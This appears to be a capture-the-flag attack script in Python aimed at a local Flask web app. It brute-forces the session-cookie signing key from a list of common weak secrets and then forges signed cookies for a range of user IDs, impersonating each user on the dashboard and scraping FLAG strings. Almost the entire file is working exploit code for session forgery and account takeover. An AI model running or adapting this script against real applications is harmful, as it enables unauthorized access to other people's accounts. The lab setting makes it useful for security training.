import sys
import requests
import json
import base64
import hashlib
import hmac
import re
from datetime import datetime

# Configuration
target_url = "http://127.0.0.1:32943"
original_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLcqQ.GOiO-YgoHJypd9IrAVxUQ6Bol_s"
dashboard_endpoint = "/dashboard"

print("[+] Starting Flask session cookie brute-force and forgery test")
print(f"[+] Target: {target_url}")
print(f"[+] Original cookie: {original_cookie}")
print(f"[+] Testing user_id range: 10030-10040")
print("=" * 60)

def decode_flask_cookie(cookie):
    """Decode a Flask session cookie without verification"""
    try:
        # Split the cookie
        parts = cookie.split('.')
        if len(parts) != 3:
            return None
        
        # Decode the payload (first part)
        payload_b64 = parts[0]
        # Add padding if needed
        missing_padding = len(payload_b64) % 4
        if missing_padding:
            payload_b64 += '=' * (4 - missing_padding)
        
        payload = base64.urlsafe_b64decode(payload_b64)
        return json.loads(payload)
    except Exception as e:
        print(f"[-] Error decoding cookie: {e}")
        return None

def verify_cookie_signature(cookie, secret):
    """Verify if a secret key can validate the cookie signature"""
    try:
        parts = cookie.split('.')
        if len(parts) != 3:
            return False
        
        payload, timestamp, signature = parts
        
        # Create the signing input
        signing_input = f"{payload}.{timestamp}"
        
        # Generate HMAC-SHA1 signature
        expected_signature = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), signing_input.encode(), hashlib.sha1).digest()
        ).decode().rstrip('=')
        
        return signature == expected_signature
    except Exception as e:
        return False

def sign_flask_cookie(payload_dict, secret):
    """Sign a Flask session cookie with a given secret"""
    try:
        # Create payload
        payload_json = json.dumps(payload_dict, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
        
        # Create timestamp (current time)
        timestamp = base64.urlsafe_b64encode(
            int(datetime.now().timestamp()).to_bytes(4, 'big')
        ).decode().rstrip('=')
        
        # Create signing input
        signing_input = f"{payload_b64}.{timestamp}"
        
        # Generate signature
        signature = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), signing_input.encode(), hashlib.sha1).digest()
        ).decode().rstrip('=')
        
        # Combine all parts
        return f"{payload_b64}.{timestamp}.{signature}"
    except Exception as e:
        print(f"[-] Error signing cookie: {e}")
        return None

# First, decode the original cookie to verify structure
print("[+] Decoding original cookie...")
decoded_payload = decode_flask_cookie(original_cookie)
if decoded_payload:
    print(f"[+] Decoded payload: {decoded_payload}")
else:
    print("[-] Failed to decode original cookie")
    sys.exit(1)

# Define common secret keys to test
common_secrets = [
    "secret",
    "SECRET_KEY",
    "flask",
    "FLASK",
    "password",
    "PASSWORD",
    "123456",
    "123456789",
    "changeme",
    "change me",
    "change_me",
    "development",
    "dev",
    "test",
    "testing",
    "prod",
    "production",
    "default",
    "flask123",
    "secret123",
    "key123",
    "admin",
    "admin123",
    "supersecret",
    "verysecret",
    "topsecret",
    "random",
    "secure",
    "private",
    "session",
    "SESSION_KEY",
    "app_secret",
    "APP_SECRET",
    "flask_secret_key",
    "FLASK_SECRET_KEY",
    "mysecretkey",
    "MY_SECRET_KEY",
    "temporary",
    "temp",
    "debug",
    "DEBUG",
    "key",
    "KEY",
    "secretkey",
    "SECRETKEY"
]

# Test each secret
found_secret = None
print("\n[+] Testing common secret keys...")

for i, secret in enumerate(common_secrets):
    if verify_cookie_signature(original_cookie, secret):
        print(f"[!] Found valid secret key: {secret}")
        found_secret = secret
        break
    
    # Print progress every 10 attempts
    if (i + 1) % 10 == 0:
        print(f"[+] Tested {i + 1}/{len(common_secrets)} secrets...")

if not found_secret:
    print("[-] Could not find valid secret key in common list")
    print("[-] The secret key might be more complex")
    sys.exit(1)

print("\n" + "=" * 60)
print(f"[+] Using secret key: {found_secret}")
print("[+] Forging session cookies for user_ids 10030-10040...")
print("=" * 60)

# Test each user_id
session = requests.Session()
flags_found = []
successful_responses = []

for user_id in range(10030, 10041):  # 10030 to 10040 inclusive
    print(f"\n[+] Testing user_id: {user_id}")
    
    # Create payload
    payload_dict = {"user_id": user_id}
    
    # Sign the cookie
    forged_cookie = sign_flask_cookie(payload_dict, found_secret)
    
    if not forged_cookie:
        print(f"[-] Failed to sign cookie for user_id {user_id}")
        continue
    
    print(f"[+] Forged cookie (first 50 chars): {forged_cookie[:50]}...")
    
    # Test the cookie against dashboard
    test_session = requests.Session()
    test_session.cookies.set('session', forged_cookie, domain='127.0.0.1')
    
    try:
        response = test_session.get(f"{target_url}{dashboard_endpoint}", timeout=10)
        
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response length: {len(response.content)} bytes")
        
        # Check for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            for flag in flag_matches:
                print(f"[!] FLAG FOUND: {flag}")
                flags_found.append({
                    'user_id': user_id,
                    'flag': flag,
                    'response_preview': response.text[:500]
                })
        else:
            print(f"[-] No FLAG found for user_id {user_id}")
        
        # Store successful responses for analysis
        if response.status_code == 200:
            successful_responses.append({
                'user_id': user_id,
                'status': response.status_code,
                'length': len(response.content),
                'preview': response.text[:200]
            })
            print(f"[+] Response preview: {response.text[:200]}...")
        else:
            print(f"[-] Non-200 status: {response.status_code}")
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed for user_id {user_id}: {str(e)}")
        continue

print("\n" + "=" * 60)
print("[+] Testing complete!")

if flags_found:
    print(f"[!] FOUND {len(flags_found)} FLAG(S):")
    for item in flags_found:
        print(f"\n  User ID {item['user_id']}:")
        print(f"  Flag: {item['flag']}")
        print(f"  Response preview: {item['response_preview']}...")
else:
    print("[-] No FLAG{} patterns found in responses")
    
if successful_responses:
    print(f"\n[+] Successful responses (200 OK): {len(successful_responses)}")
    for resp in successful_responses:
        print(f"  User ID {resp['user_id']}: {resp['length']} bytes")

# Check base URL for endpoint discovery
print("\n[+] Checking base URL for available endpoints...")
try:
    base_response = session.get(target_url, timeout=10)
    print(f"[+] Base URL status: {base_response.status_code}")
    
    if base_response.status_code == 200:
        content = base_response.text
        
        # Look for links
        links = re.findall(r'href=["\']([^"\']+)["\']', content)
        unique_links = list(set(links))
        if unique_links:
            print(f"[+] Found {len(unique_links)} links:")
            for link in unique_links[:10]:  # Show first 10
                print(f"  - {link}")
        
        # Look for forms
        forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', content)
        if forms:
            print(f"[+] Found form actions: {list(set(forms))}")
        
        # Look for any FLAG in base page
        base_flags = re.findall(r'FLAG\{[^}]+\}', content)
        if base_flags:
            print(f"[!] FLAGS in base page: {base_flags}")
            for flag in base_flags:
                flags_found.append({
                    'user_id': 'base_page',
                    'flag': flag,
                    'response_preview': content[:500]
                })
        
except requests.exceptions.RequestException as e:
    print(f"[-] Error checking base URL: {str(e)}")

print("\n[+] Script execution complete.")
